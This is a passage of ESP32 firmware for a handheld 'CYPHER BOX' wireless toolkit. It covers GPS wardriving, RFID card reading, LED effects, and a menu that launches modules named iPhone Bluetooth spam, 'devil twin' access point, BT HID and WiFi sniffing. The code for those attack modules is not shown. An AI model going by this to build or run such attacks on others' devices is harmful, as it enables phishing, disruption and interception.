  csvFile.print(",");
  csvFile.print(altitude);
  csvFile.print(",");
  csvFile.print(accuracy);
  csvFile.print(",");
  csvFile.print("\"" + rcois + "\",");
  csvFile.print("\"" + mfgrid + "\",");
  csvFile.println("\"" + type + "\"");
}
// Get the current timestamp from the RTC
String getLocalTimestamp()
{
  DateTime now = rtc.now(); // Use RTC time for timestamp
  char buffer[30];
  snprintf(buffer, sizeof(buffer), "%04d-%02d-%02d %02d:%02d:%02d", now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second());
  return String(buffer);
}

void initGPS()
{
  gpsSerial.begin(GPSBaud, SERIAL_8N1, RXPin, TXPin); // Start GPS serial communication
  delay(5000);                                        // Allow time for the system to stabilize
  Serial.print("GPS loaded.");
  // Initialize OLED display
  display.display();
  display.clearDisplay();
  delay(3000);
  // Initialize SD card
  Serial.println("Initializing SD card...");
  /*
  if (!SD.begin(SD_CS_PIN)) {
      Serial.println("Initialization failed!");
  } else {
      Serial.println("Initialization done.");
      break
  }
  
  // delay(4000);
  //  Initialize CSV file
  if (!initializeCSV())
  {
    displayError("CSV Init Error");
  }
  else
  {
    Serial.println("CSV Initialization done.");
  }
  delay(3000);
  */

  rtc.begin(DateTime(F(__DATE__), F(__TIME__))); // Initialize RTC with compile time

  Serial.println(F("GPS and WiFi Scanner"));
}

void runGPS()
{
  while (true)
  {
    // Check if HOME_BUTTON is pressed
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }

    // Read GPS data
    while (gpsSerial.available() > 0)
    {
      gps.encode(gpsSerial.read());
    }

    // Check if GPS data is valid
    if (gps.location.isValid() && gps.hdop.isValid() && gps.date.isValid() && gps.time.isValid() && gps.satellites.value() >= MIN_SATELLITES)
    {
      // Update RTC with GPS time
      DateTime gpsTime(gps.date.year(), gps.date.month(), gps.date.day(), gps.time.hour(), gps.time.minute(), gps.time.second());
      rtc.adjust(gpsTime);

      // Display GPS data and scan for WiFi networks
      displayGPSData();
      scanWiFiNetworks();
      displayGPSData();
      delay(15000); // Wait 15 seconds before next scan
    }
    else
    {
      displaySearching();
    }
  }
}// *** TOOLS MODULES ***

// RFID START
#define RST_PIN 25
#define SS_PIN 27
MFRC522 mfrc522(SS_PIN, RST_PIN);
void drawBorder()
{
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, SSD1306_WHITE);
}
void displayInfo(String title, String info1 = "", String info2 = "", String info3 = "")
{
  display.clearDisplay();
  drawBorder();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  // Title
  display.setCursor(4, 4);
  display.println(title);
  display.drawLine(0, 14, SCREEN_WIDTH, 14, SSD1306_WHITE);

  // Info lines
  display.setCursor(4, 18);
  display.println(info1);
  display.setCursor(4, 28);
  display.println(info2);
  display.setCursor(4, 38);
  display.println(info3);
  display.display();
}
void initRFID()
{
  Serial.println("MFRC522 NFC Reader");
  displayInfo("MFRC522 NFC Reader", "Initializing...");
  SPI.begin();
  delay(2000);
  mfrc522.PCD_Init();
  delay(2000);
  mfrc522.PCD_DumpVersionToSerial();
  String fwVersion = "FW: " + String(mfrc522.PCD_ReadRegister(mfrc522.VersionReg), HEX);
  String chipInfo = "Chip: MFRC522";
  displayInfo("MFRC522 Info", chipInfo, fwVersion);
  delay(2000);
  displayInfo("Ready", "Waiting for card...", "Place card near", "the reader");
}

void runRFID()
{
  while (true)
  { 
    // Check if HOME_BUTTON is pressed
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }

    if (!mfrc522.PICC_IsNewCardPresent())
    {
      static unsigned long lastUpdate = 0;
      if (millis() - lastUpdate > 5000)
      {
        displayInfo("Ready", "Waiting for card...", "Place card near", "the reader");
        lastUpdate = millis();
      }
      continue;
    }

    if (!mfrc522.PICC_ReadCardSerial())
    {
      continue;
    }

    String uidString = "";
    for (uint8_t i = 0; i < mfrc522.uid.size; i++)
    {
      uidString += (mfrc522.uid.uidByte[i] < 0x10 ? "0" : "") + String(mfrc522.uid.uidByte[i], HEX) + " ";
    }
    uidString.trim();
    String typeString = mfrc522.PICC_GetTypeName(mfrc522.PICC_GetType(mfrc522.uid.sak));
    displayInfo("Card Detected", "UID: " + uidString, "Type: " + typeString, "Size: " + String(mfrc522.uid.size) + " bytes");
    Serial.println("Found card:");
    Serial.println(" UID: " + uidString);
    Serial.println(" Type: " + typeString);

    delay(3000); 
    displayInfo("Ready", "Waiting for card...", "Place card near", "the reader");

    mfrc522.PICC_HaltA();
    mfrc522.PCD_StopCrypto1();
  }
}
// *** SYSTEM MODULES ***
// MENU
// LEDS SETUP
uint32_t getRandomColor()
{
  return strip.Color(random(256), random(256), random(256));
}
void updateNeoPixel()
{
  strip.setPixelColor(0, getRandomColor());
  strip.show();
  delay(200);                // Keep the light on for 1000 milliseconds (1 second)
  strip.setPixelColor(0, 0); // Turn off the pixel
  strip.show();              // Update the strip to show the change
}

void partyLight()
{
  // Color rotation: red, green, blue, yellow, purple, cyan
  uint32_t colors[] = {strip.Color(255, 0, 0), strip.Color(0, 255, 0), strip.Color(0, 0, 255),
                       strip.Color(255, 255, 0), strip.Color(128, 0, 128), strip.Color(0, 255, 255)};
  int numColors = sizeof(colors) / sizeof(colors[0]);
  for (int i = 0; i < numColors; i++)
  {
    int brightness = 0;
    int fadeSpeed = 5 + (i * 2); // Change speed based on color
    // Pulsate by increasing and decreasing brightness
    for (int j = 0; j <= 255; j += fadeSpeed)
    {
      brightness = j;
      setPixelColor(colors[i], brightness);
      delay(30);
    }
    for (int j = 255; j >= 0; j -= fadeSpeed)
    {
      brightness = j;
      setPixelColor(colors[i], brightness);
      delay(30);
    }
  }
}

// Helper function to set brightness by adjusting RGB values
void setPixelColor(uint32_t color, int brightness)
{
  uint8_t r = (color >> 16) & 0xFF;
  uint8_t g = (color >> 8) & 0xFF;
  uint8_t b = color & 0xFF;
  strip.setPixelColor(0, strip.Color(
                             (r * brightness) / 255,
                             (g * brightness) / 255,
                             (b * brightness) / 255));
  strip.show();
}

void turnOffNeopixel()
{
  strip.setPixelColor(0, 0); // Turn off each pixel by setting it to black (0)
  strip.show();              // Update the NeoPixel strip
}

bool isButtonPressed(uint8_t pin)
{
  if (digitalRead(pin) == LOW)
  {
    delay(100); // Debounce delay
    if (digitalRead(pin) == LOW)
    {
      digitalWrite(LED_PIN, HIGH); // Turn on LED
      return true;
    }
  }
  return false;
}

/**
 * Handles menu selection based on button presses.
 *
 * This function checks for button presses and updates the menu selection accordingly.
 * It also handles wrapping around the menu items and making the selected item visible.
 *
 * @return None
 */
void handleMenuSelection()
{
  static bool buttonPressed = false;

  if (!buttonPressed)
  {
    if (isButtonPressed(UP_BUTTON_PIN))
    {
      // Wrap around if at the top
      selectedMenuItem = static_cast<MenuItem>((selectedMenuItem == 0) ? (NUM_MENU_ITEMS - 1) : (selectedMenuItem - 1));

      if (selectedMenuItem == (NUM_MENU_ITEMS - 1))
      {
        // If wrapped to the bottom, make it visible
        firstVisibleMenuItem = NUM_MENU_ITEMS - 2;
      }
      else if (selectedMenuItem < firstVisibleMenuItem)
      {
        firstVisibleMenuItem = selectedMenuItem;
      }

      Serial.println("UP button pressed");
      drawMenu();
      buttonPressed = true;
    }
    else if (isButtonPressed(DOWN_BUTTON_PIN))
    {
      // Wrap around if at the bottom
      selectedMenuItem = static_cast<MenuItem>((selectedMenuItem + 1) % NUM_MENU_ITEMS);

      if (selectedMenuItem == 0)
      {
        // If wrapped to the top, make it visible
        firstVisibleMenuItem = 0;
      }
      else if (selectedMenuItem >= (firstVisibleMenuItem + 2))
      {
        firstVisibleMenuItem = selectedMenuItem - 1;
      }

      Serial.println("DOWN button pressed");
      drawMenu();
      buttonPressed = true;
    }
    else if (isButtonPressed(SELECT_BUTTON_PIN))
    {
      Serial.println("SELECT button pressed");
      executeSelectedMenuItem();
      buttonPressed = true;
    }
    else if (isButtonPressed(HOME_BUTTON_PIN))
    {
      selectedMenuItem = static_cast<MenuItem>(0);
      firstVisibleMenuItem = 0;
      Serial.println("HOME button pressed");
      drawMenu();
      buttonPressed = true;
    }
  }
  else
  {
    // If no button is pressed, reset the buttonPressed flag
    if (!isButtonPressed(UP_BUTTON_PIN) && !isButtonPressed(DOWN_BUTTON_PIN) && !isButtonPressed(SELECT_BUTTON_PIN) && !isButtonPressed(HOME_BUTTON_PIN))
    {
      buttonPressed = false;
      digitalWrite(LED_PIN, LOW); // Turn off LED
    }
  }
}
// Menu Functions
void executeSelectedMenuItem()
{
  switch (selectedMenuItem)
  {
  
  case PACKET_MON:
    Serial.println("PACKET button pressed");
    currentState = STATE_PACKET_MON;
    initPacketMon();
    delay(5000);
    runPacketMon();
    break;
  
  case WIFI_SNIFF:
    Serial.println("WIFI SNIFF button pressed");
    currentState = STATE_WIFI_SNIFFER;
    // test
    wifi_sniffer_init();
    delay(3000);
    runWifiSniffer();
    break;
  case AP_SCAN:
    Serial.println("AP SCAN button pressed");
    currentState = STATE_AP_SCAN;
    performScan();
    delay(2000);          // Scan for networks
    displayNetworkScan(); // Display the scanned networks
    break;
  case AP_JOIN:
    Serial.println("AP Join button pressed");
    currentState = STATE_AP_JOIN;
    startServer();
    delay(2000);
    break;
  case AP_CREATE:
    Serial.println("AP Create button pressed");
    currentState = STATE_AP_CREATE;
    startSoftAP();
    delay(2000); // Scan for networks
    break;
  case STOP_AP:
    Serial.println("STOP AP button pressed");
    currentState = STATE_STOP_AP;
    handleStopServer();
    delay(2000); // Scan for networks
    break;
  case STOP_SERVER:
    Serial.println("STOP SERVER button pressed");
    currentState = STATE_STOP_SERVER;
    handleStopServer();
    delay(2000); // Scan for networks
    break;
  case BT_SCAN:
    Serial.println("BT SCAN button pressed");
    currentState = STATE_BT_SCAN;
    initBTScan();
    delay(2000); // Scan for networks
    runBTScan();
    break;
  case BT_SERIAL_CMD:
    Serial.println("BT SCAN button pressed");
    currentState = STATE_BT_SERIAL;
    initBTSerialDisplay();
    delay(2000);
    initBTSerial();
    delay(2000);
    runBTSerial();
    while (currentState == STATE_BT_SERIAL)
    {
      runBTSerial(); // Check for Bluetooth commands
      // Add any other logic you need here
      delay(1000); // Small delay to prevent excessive CPU usage
    }
    break;
  case BT_HID:
    Serial.println("BT HID button pressed");
    currentState = STATE_BT_HID;
    initBTHid();
    delay(2000);
    runBTHid();
    break;
  case IPHONE_SPAM:
    Serial.println("IPHONE SPAM button pressed");
    currentState = STATE_IPHONE_SPAM;
    initIphoneSpam();
    Serial.print("Starting bluetooth spam.");
    delay(10000);
    xTaskCreate(runIphoneSpamTask, "iPhoneSpam", 10000, NULL, 1, &iphoneSpamTask);
    //runIphoneSpam();
    break;
  case DEVIL_TWIN:
    Serial.println("DEVIL TWIN button pressed");
    currentState = STATE_DEVIL_TWIN;
    initDevilTwin();
    delay(2000);
    runDevilTwin();
    break;
  case RFID:
    currentState = STATE_RFID;
    Serial.println("RFID button pressed");
    initRFID();
    delay(2000);
    runRFID();
    break;
  case WARDRIVER:
    Serial.println("WARDRIVER button pressed");
    currentState = STATE_WARDRIVER;
    initGPS();
    delay(2000);
    runGPS();
    break;
  case PARTY_LIGHT:
    Serial.println("PARTYLIGHT button pressed");
    partyLight();
    delay(2000);
    break;
  case LIGHTOFF:
    Serial.println("LIGHTOFF button pressed");
    turnOffNeopixel();
    delay(2000);
    break;
  }
}
void displayTitleScreen()
{
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_adventurer_tr); // Use a larger font for the title
  u8g2_for_adafruit_gfx.setCursor(20, 40);                // Centered vertically
  u8g2_for_adafruit_gfx.print("CYPHER BOX");
  // u8g2_for_adafruit_gfx.setCursor(centerX, 25); // Centered vertically
  // u8g2_for_adafruit_gfx.print("NETWORK PET");
  display.display();
}
void displayInfoScreen()
{
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf); // Set back to small font
  u8g2_for_adafruit_gfx.setCursor(0, 22);
  u8g2_for_adafruit_gfx.print("Welcome to CYPHER BOX!");

  u8g2_for_adafruit_gfx.setCursor(0, 30);
  u8g2_for_adafruit_gfx.print("This is a cool cyber tool.");

  u8g2_for_adafruit_gfx.setCursor(0, 38);
  u8g2_for_adafruit_gfx.print("I perform analysis & attacks.");

  u8g2_for_adafruit_gfx.setCursor(0, 46);
  u8g2_for_adafruit_gfx.print("Insert a SD card to save!");

  u8g2_for_adafruit_gfx.setCursor(0, 54);
  u8g2_for_adafruit_gfx.print("Have fun & be safe ~_~;");

  display.display();
}
void setup()
{
  Serial.begin(115200);
  delay(10);
  initDisplay();
  pinMode(UP_BUTTON_PIN, INPUT);
  pinMode(DOWN_BUTTON_PIN, INPUT);
  pinMode(SELECT_BUTTON_PIN, INPUT);
  pinMode(HOME_BUTTON_PIN, INPUT);
  pinMode(LED_PIN, OUTPUT);

  // Initialize U8g2_for_Adafruit_GFX
  u8g2_for_adafruit_gfx.begin(display);
  /*
    strip.begin();
    strip.setPixelColor(0, strip.Color(255, 0, 0)); // Bright red
    strip.show();                                   // Initialize all pixels to 'off'
    */

  // Display splash screens
  /*displayTitleScreen();
    delay(3000); // Show title screen for 3 seconds
    displayInfoScreen();
    delay(5000); // Show info screen for 5 seconds
    */
  // Initial display
  drawMenu();
}

void loop()
{
  switch (currentState)
  {
  case STATE_MENU:
    handleMenuSelection();
    break;
  case STATE_WIFI_SNIFFER:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      currentState = STATE_MENU;
      // Clean up WiFi sniffer if necessary
      esp_wifi_set_promiscuous(false);
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_PACKET_MON:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      delay(1000);
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_AP_SCAN:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_AP_JOIN:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_AP_CREATE:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_STOP_AP:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_STOP_SERVER:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_BT_SCAN:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      cleanupBTScan();
      delay(1000);
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_BT_SERIAL:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      cleanupBTScan();
      delay(1000);
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_BT_HID:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      cleanupBTScan();
      delay(1000);
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_IPHONE_SPAM:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      cleanupBTScan();
      delay(1000);
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_DEVIL_TWIN:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      // wifi cleanup
      delay(1000);
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_RFID:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      delay(1000);
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  case STATE_WARDRIVER:
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      delay(1000);
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }
    break;
  }
  if (serverRunning)
  {
    server.handleClient();
  }
}
